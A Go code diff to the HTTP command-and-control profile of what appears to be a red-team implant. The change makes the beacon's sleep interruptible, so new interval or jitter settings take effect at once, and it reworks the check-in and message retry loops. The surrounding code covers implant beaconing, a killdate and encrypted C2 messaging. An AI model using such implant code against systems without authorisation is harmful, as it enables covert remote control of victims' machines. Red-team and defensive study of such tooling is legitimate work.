@@ -72,11 +72,12 @@ type C2DynamicHTTP struct {
 	ExchangingKeys bool
 	ChunkSize      int `json:"chunk_size"`
 	// internally set pieces
-	Config         C2DynamicHTTPC2Config `json:"config"`
-	Key            string                `json:"encryption_key"`
-	RsaPrivateKey  *rsa.PrivateKey
-	ShouldStop     bool
-	stoppedChannel chan bool
+	Config                C2DynamicHTTPC2Config `json:"config"`
+	Key                   string                `json:"encryption_key"`
+	RsaPrivateKey         *rsa.PrivateKey
+	ShouldStop            bool
+	stoppedChannel        chan bool
+	interruptSleepChannel chan bool
 }
 
 // New creates a new DynamicHTTP C2 profile from the package's global variables and returns it
@@ -99,10 +100,11 @@ func init() {
 		os.Exit(1)
 	}
 	profile := C2DynamicHTTP{
-		Key:            initialConfig.AESPSK,
-		Killdate:       killDateTime,
-		ShouldStop:     true,
-		stoppedChannel: make(chan bool, 1),
+		Key:                   initialConfig.AESPSK,
+		Killdate:              killDateTime,
+		ShouldStop:            true,
+		stoppedChannel:        make(chan bool, 1),
+		interruptSleepChannel: make(chan bool, 1),
 	}
 
 	// Convert sleep from string to integer
@@ -157,7 +159,7 @@ func (c *C2DynamicHTTP) Start() {
 						taskResp := structs.MythicMessageResponse{}
 						if err := json.Unmarshal(resp, &taskResp); err != nil {
 							utils.PrintDebug(fmt.Sprintf("Error unmarshal response to task response: %s", err.Error()))
-							time.Sleep(time.Duration(c.GetSleepTime()) * time.Second)
+							c.Sleep()
 							continue
 						}
 						responses.HandleInboundMythicMessageFromEgressChannel <- taskResp
@@ -165,7 +167,7 @@ func (c *C2DynamicHTTP) Start() {
 				} else {
 					utils.PrintDebug(fmt.Sprintf("Failed to marshal message: %v\n", err))
 				}
-				time.Sleep(time.Duration(c.GetSleepTime()) * time.Second)
+				c.Sleep()
 			}
 		} else {
 			//fmt.Printf("Uh oh, failed to checkin\n")
@@ -208,6 +210,13 @@ func (c *C2DynamicHTTP) UpdateConfig(parameter string, value string) {
 		}
 	}
 }
+func (c *C2DynamicHTTP) Sleep() {
+	// wait for either sleep time duration or sleep interrupt
+	select {
+	case <-c.interruptSleepChannel:
+	case <-time.After(time.Second * time.Duration(c.GetSleepTime())):
+	}
+}
 func (c *C2DynamicHTTP) GetSleepTime() int {
 	if c.ShouldStop {
 		return -1
@@ -236,6 +245,9 @@ func (c *C2DynamicHTTP) GetKillDate() time.Time {
 func (c *C2DynamicHTTP) SetSleepInterval(interval int) string {
 	if interval >= 0 {
 		c.Interval = interval
+		go func() {
+			c.interruptSleepChannel <- true
+		}()
 		return fmt.Sprintf("Sleep interval updated to %ds\n", interval)
 	} else {
 		return fmt.Sprintf("Sleep interval not updated, %d is not >= 0", interval)
@@ -245,6 +257,9 @@ func (c *C2DynamicHTTP) SetSleepInterval(interval int) string {
 func (c *C2DynamicHTTP) SetSleepJitter(jitter int) string {
 	if jitter >= 0 && jitter <= 100 {
 		c.Jitter = jitter
+		go func() {
+			c.interruptSleepChannel <- true
+		}()
 		return fmt.Sprintf("Jitter updated to %d%% \n", jitter)
 	} else {
 		return fmt.Sprintf("Jitter not updated, %d is not between 0 and 100", jitter)
@@ -281,7 +296,7 @@ func (c *C2DynamicHTTP) CheckIn() structs.CheckInMessageResponse {
 		}
 		checkin := CreateCheckinMessage()
 		if raw, err := json.Marshal(checkin); err != nil {
-			time.Sleep(time.Duration(c.GetSleepTime()))
+			c.Sleep()
 			continue
 		} else {
 			resp := c.SendMessage(raw)
@@ -290,14 +305,14 @@ func (c *C2DynamicHTTP) CheckIn() structs.CheckInMessageResponse {
 			response := structs.CheckInMessageResponse{}
 			if err = json.Unmarshal(resp, &response); err != nil {
 				utils.PrintDebug(fmt.Sprintf("Error in unmarshal:\n %s", err.Error()))
-				time.Sleep(time.Duration(c.GetSleepTime()))
+				c.Sleep()
 				continue
 			}
 			if len(response.ID) != 0 {
 				SetMythicID(response.ID)
 				return response
 			} else {
-				time.Sleep(time.Duration(c.GetSleepTime()))
+				c.Sleep()
 				continue
 			}
 		}
@@ -400,34 +415,34 @@ func (c *C2DynamicHTTP) SendMessage(sendData []byte) []byte {
 		if err != nil {
 			utils.PrintDebug(fmt.Sprintf("error client.Do: %v\n", err))
 			IncrementFailedConnection(c.ProfileName())
-			time.Sleep(time.Duration(c.GetSleepTime()) * time.Second)
+			c.Sleep()
 			continue
 		}
 		if resp.StatusCode != 200 {
 			resp.Body.Close()
 			utils.PrintDebug(fmt.Sprintf("error resp.StatusCode: %v\n", resp.StatusCode))
 			IncrementFailedConnection(c.ProfileName())
-			time.Sleep(time.Duration(c.GetSleepTime()) * time.Second)
+			c.Sleep()
 			continue
 		}
 		raw, err := c.GetDynamicMessageResponse(resp, configUsed)
 		if err != nil {
 			utils.PrintDebug(fmt.Sprintf("error getting message response: %v\n", err))
 			IncrementFailedConnection(c.ProfileName())
-			time.Sleep(time.Duration(c.GetSleepTime()) * time.Second)
+			c.Sleep()
 			continue
 		}
 		raw, err = base64.StdEncoding.DecodeString(string(raw))
 		if err != nil {
 			utils.PrintDebug(fmt.Sprintf("error base64.StdEncoding: %v\n", err))
 			IncrementFailedConnection(c.ProfileName())
-			time.Sleep(time.Duration(c.GetSleepTime()) * time.Second)
+			c.Sleep()
 			continue
 		}
 		if len(raw) < 36 {
 			utils.PrintDebug(fmt.Sprintf("error len(raw) < 36: %v\n", err))
 			IncrementFailedConnection(c.ProfileName())
-			time.Sleep(time.Duration(c.GetSleepTime()) * time.Second)
+			c.Sleep()
 			continue
 		}
 		if len(c.Key) != 0 {
@@ -437,7 +452,7 @@ func (c *C2DynamicHTTP) SendMessage(sendData []byte) []byte {
 				// failed somehow in decryption
 				utils.PrintDebug(fmt.Sprintf("error decrypt length wrong: %v\n", err))
 				IncrementFailedConnection(c.ProfileName())
-				time.Sleep(time.Duration(c.GetSleepTime()) * time.Second)
+				c.Sleep()
 				continue
 			} else {
 				//fmt.Printf("decrypted response: %v\n%v\n", string(raw[:36]), string(enc_raw))
